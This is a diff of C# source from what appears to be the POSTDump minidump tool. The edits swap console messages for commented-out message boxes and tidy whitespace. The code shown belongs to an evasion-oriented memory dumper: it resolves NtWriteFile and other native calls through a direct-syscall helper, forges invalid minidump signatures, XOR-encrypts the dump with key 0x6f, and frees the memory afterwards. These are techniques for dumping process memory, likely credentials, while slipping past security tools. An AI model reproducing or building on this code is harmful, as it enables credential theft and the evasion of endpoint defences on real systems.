@@ -55,12 +55,12 @@ namespace POSTMiniDump
         {
             if ((dc.rva + size) < dc.rva)
             {
-                Console.WriteLine("The dump size exceeds the 32-bit address space!");
+                //MessageBox.Show("The dump size exceeds the 32-bit address space!");
                 return false;
             }
             else if ((ulong)(dc.rva + size) >= dc.DumpMaxSize)
             {
-                Console.WriteLine("The dump is too big, please increase DUMP_MAX_SIZE.");
+                //MessageBox.Show("The dump is too big, please increase DUMP_MAX_SIZE.");
                 return false;
             }
             else
@@ -109,7 +109,7 @@ namespace POSTMiniDump
             handle3.Free();
         }
 
-        
+
         public static void generate_invalid_sig(out uint Signature, out uint Version, out ushort ImplementationVersion)
         {
             Random rng = new Random(DateTime.Now.Millisecond);
@@ -120,7 +120,7 @@ namespace POSTMiniDump
 
             while (Signature == Data.MINIDUMP_SIGNATURE || Version == Data.MINIDUMP_VERSION || ImplementationVersion == Data.MINIDUMP_IMPL_VERSION)
             {
-               
+
                 Signature = (uint)rng.Next();
                 Signature |= (Signature & 0x7FFF) << 0x11;
                 Signature |= (Signature & 0x7FFF) << 0x02;
@@ -133,10 +133,10 @@ namespace POSTMiniDump
                 ImplementationVersion = (ushort)rng.Next();
                 ImplementationVersion |= (ushort)((ImplementationVersion & 0xFF) << 0x08);
                 ImplementationVersion |= (ushort)((ImplementationVersion & 0xFF) << 0x00);
-                
+
             }
         }
-        
+
         public static void encrypt_dump(IntPtr baseaddr, long RegionSize)
         {
             byte key = 0x6f;
@@ -163,11 +163,11 @@ namespace POSTMiniDump
             Data.NTSTATUS status = NTFVM((IntPtr)(-1), ref baseaddr, ref RegionSize, 0x8000);
             if (status != Data.NTSTATUS.Success)
             {
-                Console.WriteLine("Failed to release virtual memory");
+                //MessageBox.Show("Failed to release virtual memory");
                 return;
             }
 
-            //Console.WriteLine("Dumped erased from allocated memory.");
+            ////MessageBox.Show("Dumped erased from allocated memory.");
 
         }
 
@@ -176,9 +176,9 @@ namespace POSTMiniDump
             Data.UNICODE_STRING full_dump_path_uni = new Data.UNICODE_STRING();
             string full_dump_path = "";
             string currentDir = Environment.CurrentDirectory;
-            if ( DumpPath.Contains(@":\"))
+            if (DumpPath.Contains(@":\"))
             {
-                full_dump_path =  DumpPath;
+                full_dump_path = DumpPath;
             }
             else
             {
@@ -212,19 +212,19 @@ namespace POSTMiniDump
 
             Data.NTSTATUS status = NTCF(out hFile, Data.FileAccess.FILE_GENERIC_WRITE, ref objAttr, ref IoStatusBlock, ref fileLength, System.IO.FileAttributes.Normal, System.IO.FileShare.None, 0x00000005, 0x00000020, IntPtr.Zero, 0);
 
-            if (status == Data.NTSTATUS.ObjectPathNotFound ||  status == Data.NTSTATUS.ObjectNameInvalid)
+            if (status == Data.NTSTATUS.ObjectPathNotFound || status == Data.NTSTATUS.ObjectNameInvalid)
             {
-                Console.WriteLine($"The path {full_dump_path} is invalid.");
+                //MessageBox.Show($"The path {full_dump_path} is invalid.");
                 return false;
             }
 
             if (status != Data.NTSTATUS.Success)
             {
-                Console.WriteLine($"Could not create file {full_dump_path}, error: {status.ToString()}");
+                //MessageBox.Show($"Could not create file {full_dump_path}, error: {status.ToString()}");
                 return false;
             }
 
-            //IntPtr ntwritefileptr = POSTDump.Postdump.isyscall.GetSyscallPtr("NtWriteFile");
+            //NtWriteFile NTWF = (NtWriteFile)Marshal.GetDelegateForFunctionPointer(POSTDump.ISyscall.GetExportAddress("NtWriteFile"), typeof(NtWriteFile));
             NtWriteFile NTWF = (NtWriteFile)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.GetSyscallPtr("NtWriteFile"), typeof(NtWriteFile));
             Data.NTSTATUS status2 = NTWF(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out IoStatusBlock, fileData, fileLength, 0, 0);
             if (status2 != Data.NTSTATUS.Success)
@@ -232,7 +232,7 @@ namespace POSTMiniDump
                 Console.WriteLine($"Could not write the dump {full_dump_path}, error: {status2.ToString()}");
                 return false;
             }
-            
+
             return true;
         }
     }
